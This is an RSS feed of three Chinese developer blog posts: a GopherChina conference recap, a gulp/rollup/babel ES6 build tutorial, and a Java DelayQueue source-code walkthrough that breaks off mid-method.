<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>GopherChina第二天小结 - 轩脉刃</title>
<link>http://www.cnblogs.com/yjf512/p/10788248.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yjf512/p/10788248.html</guid>
<description>&lt;p&gt;今天继续昨天的文章，参加了第二天的GopherChina，例行完成总结。&lt;/p&gt;

&lt;p&gt;关于对象存储，之前用过seaweedfs，但是对MINIO这个项目真是一无所知。于乐分享了下东道主探探在使用MINIO的整个过程。现在回想下来，最具有印象的是他们针对上线后的问题做的一些优化。首先在写过程做了小文件写合并成一个大文件的写的优化，另外一个是读的过程做的优化，把meta信息存放在levelDB中。最后说出来的优化操作也就这两个地方，但是在整个过程中如何找到瓶颈点的过程是颇为精彩的。首先是采集profile信息，mc和pprof，把酷炫的火焰图绘制出来了，然后告诉我们，从这个图里面看不出什么东西。。。囧。。。然后通过最土的方式统计函数调用时长，通过分析时长关注到了是IO调用的问题，继而分析了下MINIO的写流程，想到了MINIO的写是随机写，当使用不上pagecache的时候，就会有性能问题了。从而使用了小文件合并大文件的方法。这个方法在文件系统的设计使用上也是很常用的。这里我学习到了一个fio测试工具，来测试io的性能。接着针对读流程，进行读压测，发现一旦不是顺序读，从N个节点上读取meta信息这个读操作会导致整体读操作性能降低，这个操作是可以优化的。综上，就在读和写两个方面做了优化。&lt;/p&gt;
&lt;p&gt;整体topic听下来就莫名有一条时间线牵着，从接到需求，技术选型，技术调研，部署，遇到问题，分析，尝试，最终解决方案。就好像跟着讲师一起从零搭建了一套对象存储系统，非常精彩。确实大量的小文件存储系统的设计和使用是很难的一件事情。回来之后，我就给MINIO加了个星星。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://tuchuang.funaio.cn/gopherchinaWechatIMG32.jpeg&quot; alt=&quot;参会&quot;/&gt;&lt;/p&gt;

&lt;p&gt;这个讲师何源的气场就明显高于上个讲师了。这个topic的需求缘起我现在其实都觉得有点意思。有一堆做教研的人员需要录入大量题目，但是他们觉得使用Web页面录入效率太低，并且一旦修改，没有版本记录。所以就想到使用标记语言来代替表单录入，使用git进行提交管理，并且使用CI进行提交测试。这是多么极客的做法！！！相当于让运营人员写markdown了。哈。可能就和讲师说的，工程师就是魔法师，没有工程师解决不了的问题，如果有，那么就找两个工程师。可想他们公司的文化应该也是很推崇技术的把。&lt;/p&gt;
&lt;p&gt;其实我觉得，他们这个需求被满足最难的点是业务上能想到使用标记语言+git进行教研的录入。后续的技术就是围绕如何用Go实现自定义标记语言的解析和创建AST树。这一部分就是状态机概念，根据不同的token，解析器进入不同的状态，直到将文本解析完毕，然后进行语法树的创建。他中间的大篇幅PPT就是围绕代码展示说起。其实感觉上去，想清楚了使用状态机模型，其他的东西也就全部完成了，都是细节实现的东西了。其实当时我还私下YY了一下，要是我做这个需求，好像golang channel的pipeline模型很适合这个模式，能做到解析和分析流式进行。不过也仅限于YY了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://tuchuang.funaio.cn/gopherchinaWechatIMG33.jpeg&quot; alt=&quot;参会&quot;/&gt;&lt;/p&gt;

&lt;p&gt;BAT中的T的大杀器推荐topic。Tars框架已经是一个很出名的项目了，不过之前也是没有了解。这次听下来全程乍舌，真牛逼！！不过私下想，这么庞大的一个框架，涵盖服务框架，服务治理，部署运营，调度等集于一身，也只有超级大厂能有此等人才和人力了。感觉一个公司可以完全照搬全收他们这一套，来应付开发+运维+架构的工作了。&lt;/p&gt;
&lt;p&gt;前面的n个ppt我听完只能海豹式鼓掌了。后面几个PPT却是有一些实用的，在开发tarsgo过程中他们注意到的点，比如尽量不用反射，尽量使用指针返回数据，如何优化Timer，使用sync.pool来缓存临时对象。这些在实际coding中都是要注意的点。&lt;/p&gt;
&lt;p&gt;同样，听完之后回来，他们的Tars和TarsGo多了我这颗星星。&lt;/p&gt;

&lt;p&gt;这个话题要是在去年，是不是应该要爆了场了。但是在今年。。。没有任何区块链底子的我，听的迷迷糊糊。整场听下来，算是普及之旅把。&lt;/p&gt;
&lt;p&gt;这个topic给我普及了什么是以太坊，什么是闪电网络。还给我普及了做区块链的人根本不知道谁是中本聪。后面还有洋葱路由的概念也是第一次听到，这是一种网络上匿名沟通的传递方式。&lt;/p&gt;
&lt;p&gt;虽然讲了很多，但是对于我这个区块链小白来说，太深了。也着实没有啥兴趣继续了解。&lt;/p&gt;

&lt;p&gt;Goland老外的分享。这个老外的语速比Dave明显快了不少。还好身边全程有个台湾小哥哥做翻译，而且内容多为演示，基本没有漏get什么信息。&lt;/p&gt;
&lt;p&gt;老外首先介绍了下GoMod。由于我司统一使用glide，对于go mod确实了解不多。但是看了一下具体的使用演示，感觉它解决了依赖版本冲突的问题，而且有个GOPROXY，能很方便解决墙、私有Go库的问题。就是有个地方我觉得有点奇怪，如果我的这个包版本升级了使用v2，我竟然需要去修改import的内容，增加个v2标记。感觉这个有点奇怪。&lt;/p&gt;
&lt;p&gt;golang的官方对依赖的模块既然推荐使用了go mod，并且在1.13把go mod作为默认的包管理工具，我希望我司后续也能拥抱go mod。&lt;/p&gt;
&lt;p&gt;然后就是老外对GOLAND的使用，让场下不少人都感叹：我们平时用的是Goland么。。。我就在感概了，我们刚接触golang的时候，那个时候有个小太极liteide就很了不起了。Golang在这几年的发展确实很快，不仅仅是语言，周边也逐渐都完善起来了。&lt;/p&gt;

&lt;p&gt;这个中间件是mysql的中间件，名叫Gaea。&lt;/p&gt;
&lt;p&gt;刚看到是mysql中间件的时候，就有点嘀咕了，现在mysql的中间件方案已经那么成熟了都，还造轮子。。。后来看了下，这个Gaea看起来比mycat等多了不少功能。也转念想了想，大厂自己从零打造一个轮子也还是有好处的，至少不是黑盒使用了。不过看到这个中间件的sqlparse使用的是TiDB的sqlparse，就让我对pingcap公司又多了几分敬重。&lt;/p&gt;
&lt;p&gt;Gaea下个月才打算开源。同样，我也主要关注他们实现过程中使用go的一些亮点。一个是配置热加载。通过atomic的Store方法实现配置的源自加载的方法我记下了。还有就是连接池，貌似一个goroutine一个connection的模式在高并发下是不可选的，都是对goroutine的浪费。好多服务框架都选择使用了goroutine连接池的方式来实现。关于连接池保活的方案他们不是使用日常的ping，而是使用创建一段时间后自动reconnect的方式来做的。这个感觉还是有点特别的。然后说了下Context的使用，这个话题这次会议已经有n个topic说过了。。。还说了下他们使用时间片来实现的session管理。&lt;/p&gt;
&lt;p&gt;这个项目的星星等下个月他们开源了再给他们把，先欠着。&lt;/p&gt;

&lt;p&gt;洋总是我以前在360的老同事了。这个topic也是我很期待的。毕竟他在花椒从零开始做起了技术中台。&lt;/p&gt;
&lt;p&gt;洋总一来就讨论起了语言，放了几个PHP和Go语言的对比，讨论了下花椒不同情境下对技术中台技术栈选型的思考。当下我看了看之前加的一些群，有看到这个ppt的也在讨论谁是世界上最好的语言的事情。我很认同洋总在语言选择上的观点的。收益！语言本质就是为业务服务的。没有业务收益的动作还是少做为妙。而且考虑的条件越多，语言层面的收益会越来越小。&lt;/p&gt;
&lt;p&gt;然后讨论的是中台应该做什么。现在中台这个说法真是很火，动不动就是一个业务中台。洋总眼中的中台是以业务高效为原则而高度定制化的。很接地气的说法，能让业务好好跑的中台就是好中台。而后介绍了他们给业务做的一些中台服务，gokeeper,总线服务，cron任务管理服务等。整体感觉下来，他们中台服务做的非常细，很多业务的需求已经渗透进入了业务中台了。关于这个事情，洋总没有纯技术人的洁癖，反而很自豪说，现在我们很乐于告诉业务，这个需求我们也能做。我想，这就是经历了创业公司从零到一才能培养出来的实干风格把。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://tuchuang.funaio.cn/gopherchinaWechatIMG34.jpeg&quot; alt=&quot;参会&quot;/&gt;&lt;/p&gt;

&lt;p&gt;这是最后一个topic，我却很有性质听完了，因为我是知乎的忠实粉丝。&lt;/p&gt;
&lt;p&gt;很高兴知乎技术栈从python转成golang。这个topic分享的就是他们在转语言重构过程中的一些实践经验。&lt;/p&gt;
&lt;p&gt;其实整个重构过程也是中规中矩的，创建新服务，然后测试，测试完成了，切流量。最终的重构结果是喜人的，节约了80%的服务器资源。&lt;/p&gt;
&lt;p&gt;后半部分的PPT我觉得是亮点。我之前也做过重构，深知重构是最最难的一件事情，没有之一。他们的一些经验我很很认同。首先，重构和优化不要同时做！！！这个我感同身受，如果你修自行车的时候，头脑里面想的是摩托车，你这个车子肯定四不像了。其次，他们的这个“panic&amp;amp;recover 不推荐，但真香”。这个观点和我之前发的一篇文章[文章]不谋而和，我也是在一个项目中践行了panic+recover的方式，一下有找到知音的感觉。还有一个封装goroutine的方法，也是我之前很痛苦的，痛苦的点在golang中对goroutine的管理在外部是不可控的，知乎这种做法等于使用了panic+recover做到了在内部随时控制跳出goroutine的方法。他们还有一个亮点，在golang中调用python，就是使用golang调用cgo，再调用c，再通过c调用python。这个链条是真没想到。不过奈何讲师最后告知，这个做法的效率极低，他们最后还是把所有的python库也都切换为golang了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://tuchuang.funaio.cn/gopherchinaWechatIMG35.jpeg&quot; alt=&quot;参会&quot;/&gt;&lt;/p&gt;

&lt;p&gt;今天的干货topic很多，学到的招数也有几个了。这次大会让我感觉到golang在很多公司都已经开始开花了。我记得在刚接触golang的时候，大家挂在口中最多的就是试试，看看。现在这么多公司在实际生产项目中都使用到了golang，真是最好的背书了。&lt;/p&gt;
&lt;p&gt;写完了11点多了，听完这次大会，真心有冲动把我手头的一个数据处理逻辑比较重的项目改为golang。耳边又响起了洋总的业务收益论，冷静冷静。。。&lt;/p&gt;

&lt;p&gt;我们组一个小伙也参加了这次的gopherchina，他在朋友圈的留言颇有有趣，经过他本人同意，这里作为彩蛋贴出来：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://tuchuang.funaio.cn/gopherchina1556465582868.jpg&quot; alt=&quot;参会&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://tuchuang.funaio.cn/gopherchina1556465629664.jpg&quot; alt=&quot;参会&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 28 Apr 2019 23:35:00 +0000</pubDate>
<dc:creator>轩脉刃</dc:creator>
<og:description>GopherChina第二天小结 今天继续昨天的文章，参加了第二天的GopherChina，例行完成总结。 基于MINIO的对象存储方案在探探的实践 关于对象存储，之前用过seaweedfs，但是对M</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yjf512/p/10788248.html</dc:identifier>
</item>
<item>
<title>gulp + gulp-better-rollup + rollup 构建 ES6 开发环境 - 雨霖月寒</title>
<link>http://www.cnblogs.com/jofun/p/10787826.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jofun/p/10787826.html</guid>
<description>&lt;h2&gt;gulp + gulp-better-rollup + rollup 构建 ES6 开发环境&lt;/h2&gt;
&lt;p&gt;关于 &lt;a href=&quot;https://www.gulpjs.com.cn/&quot; target=&quot;_blank&quot;&gt;Gulp&lt;/a&gt; 就不过多啰嗦了。常用的 js 模块打包工具主要有 &lt;a href=&quot;https://www.webpackjs.com/&quot; target=&quot;_blank&quot;&gt;webpack&lt;/a&gt;、&lt;a href=&quot;https://www.rollupjs.com/guide/zh&quot; target=&quot;_blank&quot;&gt;rollup&lt;/a&gt; 和 &lt;a href=&quot;http://browserify.org/&quot; target=&quot;_blank&quot;&gt;browserify&lt;/a&gt; 三个，Gulp 构建 ES6 开发环境通常需要借助这三者之一来合并打包 ES6 模块代码。因此，Gulp 构建 ES6 开发环境的方案有很多，例如：webpack-stream、rollup-stream 、browserify等，本文讲述使用 &lt;a href=&quot;https://www.npmjs.com/package/gulp-better-rollup&quot; target=&quot;_blank&quot;&gt;gulp-better-rollup&lt;/a&gt; 的构建过程。gulp-better-rollup 可以将 rollup 更深入地集成到Gulps管道链中。&lt;/p&gt;&lt;p&gt;GitHub地址：&lt;a href=&quot;https://github.com/JofunLiang/gulp-translation-es6-demo&quot; target=&quot;_blank&quot;&gt;https://github.com/JofunLiang/gulp-translation-es6-demo&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;articleHeader1&quot;&gt;构建基础的 ES6 语法转译环境&lt;/h2&gt;
&lt;p&gt;首先，安装 gulp 工具，命令如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
$ npm install --save-dev gulp
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;安装 gulp-better-rollup 插件，由于 gulp-better-rollup 需要 rollup 作为依赖，因此，还要安装 rollup 模块和 rollup-plugin-babel（rollup 和 babel 之间的无缝集成插件）：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
$ npm install --save-dev gulp-better-rollup rollup rollup-plugin-babel
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;安装 babel 核心插件:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;hljs ruby&quot;&gt;
$ npm install --save-dev @babel/core @babel/preset-env
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;安装完成后，配置 .babelrc 文件和 gulpfile.js文件，将这两个文件放在项目根目录下。&lt;/p&gt;

&lt;p&gt;新建 .babelrc 配置文件如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;{
  &lt;/span&gt;&quot;presets&quot;&lt;span&gt;: [
    [
      &lt;/span&gt;&quot;@babel/env&quot;&lt;span&gt;,
      {
        &lt;/span&gt;&quot;targets&quot;&lt;span&gt;:{
          &lt;/span&gt;&quot;browsers&quot;: &quot;last 2 versions, &amp;gt; 1%, ie &amp;gt;= 9&quot;&lt;span&gt;
        },
        &lt;/span&gt;&quot;modules&quot;: &lt;span&gt;false&lt;/span&gt;&lt;span&gt;
      }
    ]
  ]
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;新建 gulpfile.js 文件如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
const gulp = require(&quot;gulp&quot;&lt;span&gt;);
const rollup &lt;/span&gt;= require(&quot;gulp-better-rollup&quot;&lt;span&gt;);
const babel &lt;/span&gt;= require(&quot;rollup-plugin-babel&quot;&lt;span&gt;);

gulp.task(&lt;/span&gt;&quot;babel&quot;, () =&amp;gt;&lt;span&gt; {
  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; gulp.src(&quot;src/**/*.js&quot;&lt;span&gt;)
    .pipe(rollup({
      plugins: [babel()]
    },{
      format: &lt;/span&gt;&quot;iife&quot;&lt;span&gt;
    }))
    .pipe(gulp.dest(&lt;/span&gt;&quot;dist&quot;&lt;span&gt;))
})

gulp.task(&lt;/span&gt;&quot;watch&quot;, () =&amp;gt;&lt;span&gt; {
    gulp.watch(&lt;/span&gt;&quot;src/**/*.js&quot;, gulp.series(&quot;babel&quot;&lt;span&gt;))
})

gulp.task(&lt;/span&gt;&quot;default&quot;, gulp.series([&quot;babel&quot;, &quot;watch&quot;]))
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;在 src 目录下使用 ES6 语法新建 js 文件，然后运行 gulp 默认任务，检查 dist 下的文件是否编译成功。&lt;/p&gt;

&lt;h2 id=&quot;articleHeader2&quot;&gt;使用 ployfill 兼容&lt;/h2&gt;
&lt;p&gt;经过上面的构建过程，成功将 ES6 语法转译为 ES5 语法，但也仅仅是转换的语法，新的 api（如：Set、Map、Promise等） 并没有被转译。关于 ployfill 兼容可以直接在页面中引入 ployfill.js 或 ployfill.min.js 文件实现，这种方式比较简单，本文不再赘述，下面讲下在构建中的实现方式。&lt;/p&gt;
&lt;p&gt;安装 @babel/plugin-transform-runtime 、@babel/runtime-corejs2 和 core-js@2（注意：core-js的版本要和@babel/runtime的版本对应，如：@babel/runtime-corejs2对应core-js@2）。@babel/plugin-transform-runtime 的作用主要是避免污染全局变量和编译输出中的重复。@babel/runtime（此处指@babel/runtime-corejs2）实现运行时编译到您的构建中。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
$ npm install --save-dev @babel/plugin-transform-runtime @babel/runtime-corejs2 core-js@2
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;修改 .babelrc 文件：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;{
  &lt;/span&gt;&quot;presets&quot;&lt;span&gt;: [
    [
      &lt;/span&gt;&quot;@babel/env&quot;&lt;span&gt;,
      {
        &lt;/span&gt;&quot;targets&quot;&lt;span&gt;:{
          &lt;/span&gt;&quot;browsers&quot;: &quot;last 2 versions, &amp;gt; 1%, ie &amp;gt;= 9&quot;&lt;span&gt;
        },
        &lt;/span&gt;&quot;modules&quot;: &lt;span&gt;false&lt;/span&gt;&lt;span&gt;
      }
    ]
  ],
  &lt;/span&gt;&quot;plugins&quot;&lt;span&gt;: [
    [
      &lt;/span&gt;&quot;@babel/plugin-transform-runtime&quot;&lt;span&gt;, {
        &lt;/span&gt;&quot;corejs&quot;: 2&lt;span&gt;
      }
    ]
  ]
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;同时修改 gulpfile.js 文件，给 rollup-plugin-babel 配置 runtimeHelpers 属性如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
const gulp = require(&quot;gulp&quot;&lt;span&gt;);
const rollup &lt;/span&gt;= require(&quot;gulp-better-rollup&quot;&lt;span&gt;);
const babel &lt;/span&gt;= require(&quot;rollup-plugin-babel&quot;&lt;span&gt;);

gulp.task(&lt;/span&gt;&quot;babel&quot;, () =&amp;gt;&lt;span&gt; {
  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; gulp.src(&quot;src/**/*.js&quot;&lt;span&gt;)
    .pipe(rollup({
      plugins: [
        babel({
          runtimeHelpers: &lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;
        })
      ]
    },{
      format: &lt;/span&gt;&quot;iife&quot;&lt;span&gt;
    }))
    .pipe(gulp.dest(&lt;/span&gt;&quot;dist&quot;&lt;span&gt;))
})

gulp.task(&lt;/span&gt;&quot;watch&quot;, () =&amp;gt;&lt;span&gt; {
    gulp.watch(&lt;/span&gt;&quot;src/**/*.js&quot;, gulp.series(&quot;babel&quot;&lt;span&gt;))
})

gulp.task(&lt;/span&gt;&quot;default&quot;, gulp.series([&quot;babel&quot;, &quot;watch&quot;]))
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;再安装 rollup-plugin-node-resolve 和 rollup-plugin-commonjs，这两个插件主要作用是注入 node_modules 下的基于 commonjs 模块标准的模块代码。在这里的作用主要是加载 ployfill 模块。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
$ npm install --save-dev rollup-plugin-node-resolve rollup-plugin-commonjs
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;在修改 gulpfile.js 文件如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
const gulp = require(&quot;gulp&quot;&lt;span&gt;);
const rollup &lt;/span&gt;= require(&quot;gulp-better-rollup&quot;&lt;span&gt;);
const babel &lt;/span&gt;= require(&quot;rollup-plugin-babel&quot;&lt;span&gt;);
const resolve &lt;/span&gt;= require(&quot;rollup-plugin-node-resolve&quot;&lt;span&gt;);
const commonjs &lt;/span&gt;= require(&quot;rollup-plugin-commonjs&quot;&lt;span&gt;);

gulp.task(&lt;/span&gt;&quot;babel&quot;, () =&amp;gt;&lt;span&gt; {
  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; gulp.src(&quot;src/**/*.js&quot;&lt;span&gt;)
    .pipe(rollup({
      plugins: [
        commonjs(),
        resolve(),
        babel({
          runtimeHelpers: &lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;
        })
      ]
    },{
      format: &lt;/span&gt;&quot;iife&quot;&lt;span&gt;
    }))
    .pipe(gulp.dest(&lt;/span&gt;&quot;dist&quot;&lt;span&gt;))
})

gulp.task(&lt;/span&gt;&quot;watch&quot;, () =&amp;gt;&lt;span&gt; {
    gulp.watch(&lt;/span&gt;&quot;src/**/*.js&quot;, gulp.series(&quot;babel&quot;&lt;span&gt;))
})

gulp.task(&lt;/span&gt;&quot;default&quot;, gulp.series([&quot;babel&quot;, &quot;watch&quot;]))
&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&quot;articleHeader3&quot;&gt;使用 sourcemaps 和压缩&lt;/h2&gt;
&lt;p&gt;注意压缩使用 rollup-plugin-uglify 插件，为了提升打包速度，我们把模块文件放到 src/js/modules 文件夹下，将 gulp.src(&quot;src/js/&lt;em&gt;.js&quot;) 改为 gulp.src(&quot;src/js/&lt;/em&gt;.js&quot;) 只打包主文件不打包依赖模块。&lt;/p&gt;

&lt;p&gt;安装 gulp-sourcemaps 和 rollup-plugin-uglify 插件：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;hljs sql&quot;&gt;
npm install --save-dev gulp-sourcemaps rollup-plugin-uglify&lt;code&gt; &lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;修改 gulpfile.js 文件如下：&lt;/p&gt;

</description>
<pubDate>Sun, 28 Apr 2019 15:45:00 +0000</pubDate>
<dc:creator>雨霖月寒</dc:creator>
<og:description>关于 Gulp 就不过多啰嗦了。常用的 js 模块打包工具主要有 webpack、rollup 和 browserify 三个，Gulp 构建 ES6 开发环境通常需要借助这三者之一来合并打包 ES6</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/jofun/p/10787826.html</dc:identifier>
</item>
<item>
<title>死磕 java集合之DelayQueue源码分析 - 彤哥读源码</title>
<link>http://www.cnblogs.com/tong-yuan/p/DelayQueue.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/tong-yuan/p/DelayQueue.html</guid>
<description>&lt;h2 id=&quot;问题&quot;&gt;问题&lt;/h2&gt;
&lt;p&gt;（1）DelayQueue是阻塞队列吗？&lt;/p&gt;
&lt;p&gt;（2）DelayQueue的实现方式？&lt;/p&gt;
&lt;p&gt;（3）DelayQueue主要用于什么场景？&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;简介&lt;/h2&gt;
&lt;p&gt;DelayQueue是java并发包下的延时阻塞队列，常用于实现定时任务。&lt;/p&gt;
&lt;h2 id=&quot;继承体系&quot;&gt;继承体系&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/alan-tang-tt/yuan/raw/master/%E6%AD%BB%E7%A3%95%20java%E9%9B%86%E5%90%88%E7%B3%BB%E5%88%97/resource/DelayQueue.png&quot; alt=&quot;qrcode&quot;/&gt;&lt;/p&gt;
&lt;p&gt;从继承体系可以看到，DelayQueue实现了BlockingQueue，所以它是一个阻塞队列。&lt;/p&gt;
&lt;p&gt;另外，DelayQueue还组合了一个叫做Delayed的接口，DelayQueue中存储的所有元素必须实现Delayed接口。&lt;/p&gt;
&lt;p&gt;那么，Delayed是什么呢？&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public interface Delayed extends Comparable&amp;lt;Delayed&amp;gt; {

    long getDelay(TimeUnit unit);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Delayed是一个继承自Comparable的接口，并且定义了一个getDelay()方法，用于表示还有多少时间到期，到期了应返回小于等于0的数值。&lt;/p&gt;
&lt;h2 id=&quot;源码分析&quot;&gt;源码分析&lt;/h2&gt;
&lt;h3 id=&quot;主要属性&quot;&gt;主要属性&lt;/h3&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 用于控制并发的锁
private final transient ReentrantLock lock = new ReentrantLock();
// 优先级队列
private final PriorityQueue&amp;lt;E&amp;gt; q = new PriorityQueue&amp;lt;E&amp;gt;();
// 用于标记当前是否有线程在排队（仅用于取元素时）
private Thread leader = null;
// 条件，用于表示现在是否有可取的元素
private final Condition available = lock.newCondition();&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;从属性我们可以知道，延时队列主要使用优先级队列来实现，并辅以重入锁和条件来控制并发安全。&lt;/p&gt;
&lt;p&gt;因为优先级队列是无界的，所以这里只需要一个条件就可以了。&lt;/p&gt;
&lt;p&gt;还记得优先级队列吗？点击链接直达【&lt;a href=&quot;https://mp.weixin.qq.com/s/kGKS7WXWbf-ME1_Hr3Fpgw&quot;&gt;死磕 java集合之PriorityQueue源码分析&lt;/a&gt;】&lt;/p&gt;
&lt;h3 id=&quot;主要构造方法&quot;&gt;主要构造方法&lt;/h3&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public DelayQueue() {}

public DelayQueue(Collection&amp;lt;? extends E&amp;gt; c) {
    this.addAll(c);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;构造方法比较简单，一个默认构造方法，一个初始化添加集合c中所有元素的构造方法。&lt;/p&gt;
&lt;h3 id=&quot;入队&quot;&gt;入队&lt;/h3&gt;
&lt;p&gt;因为DelayQueue是阻塞队列，且优先级队列是无界的，所以入队不会阻塞不会超时，因此它的四个入队方法是一样的。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public boolean add(E e) {
    return offer(e);
}

public void put(E e) {
    offer(e);
}

public boolean offer(E e, long timeout, TimeUnit unit) {
    return offer(e);
}

public boolean offer(E e) {
    final ReentrantLock lock = this.lock;
    lock.lock();
    try {
        q.offer(e);
        if (q.peek() == e) {
            leader = null;
            available.signal();
        }
        return true;
    } finally {
        lock.unlock();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;入队方法比较简单：&lt;/p&gt;
&lt;p&gt;（1）加锁；&lt;/p&gt;
&lt;p&gt;（2）添加元素到优先级队列中；&lt;/p&gt;
&lt;p&gt;（3）如果添加的元素是堆顶元素，就把leader置为空，并唤醒等待在条件available上的线程；&lt;/p&gt;
&lt;p&gt;（4）解锁；&lt;/p&gt;
&lt;h3 id=&quot;出队&quot;&gt;出队&lt;/h3&gt;
&lt;p&gt;因为DelayQueue是阻塞队列，所以它的出队有四个不同的方法，有抛出异常的，有阻塞的，有不阻塞的，有超时的。&lt;/p&gt;
&lt;p&gt;我们这里主要分析两个，poll()和take()方法。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public E poll() {
    final ReentrantLock lock = this.lock;
    lock.lock();
    try {
        E first = q.peek();
        if (first == null || first.getDelay(NANOSECONDS) &amp;gt; 0)
            return null;
        else
            return q.poll();
    } finally {
        lock.unlock();
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;poll()方法比较简单：&lt;/p&gt;
&lt;p&gt;（1）加锁；&lt;/p&gt;
&lt;p&gt;（2）检查第一个元素，如果为空或者还没到期，就返回null；&lt;/p&gt;
&lt;p&gt;（3）如果第一个元素到期了就调用优先级队列的poll()弹出第一个元素；&lt;/p&gt;
&lt;p&gt;（4）解锁。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public E take() throws InterruptedException {
    final ReentrantLock lock = this.lock;
    lock.lockInterruptibly();
    try {
        for (;;) {
            // 堆顶元素
            E first = q.peek();
            // 如果堆顶元素为空，说明队列中还没有元素，直接阻塞等待
            if (first == null)
                available.await();
            else {
                // 堆顶元素的到期时间
                long delay = first.getDelay(NANOSECONDS);
                // 如果小于0说明已到期，直接调用poll()方法弹出堆顶元素
                if (delay &amp;lt;= 0)
                    return q.poll();
                
                // 如果delay大于0 ，则下面要阻塞了
                
                // 将first置为空方便gc，因为有可能其它元素弹出了这个元素
                // 这里还持有着引用不会被清理
                first = null; // don't retain ref while waiting
                // 如果前面有其它线程在等待，直接进入等待
                if (leader != null)
                    available.await();
                else {
                    // 如果leader为null，把当前线程赋值给它
                    Thread thisThread = Thread.currentThread();
                    leader = thisThread;
                    try {
                        // 等待delay时间后自动醒过来
                        // 醒过来后把leader置空并重新进入循环判断堆顶元素是否到期
                        // 这里即使醒过来后也不一定能获取到元素
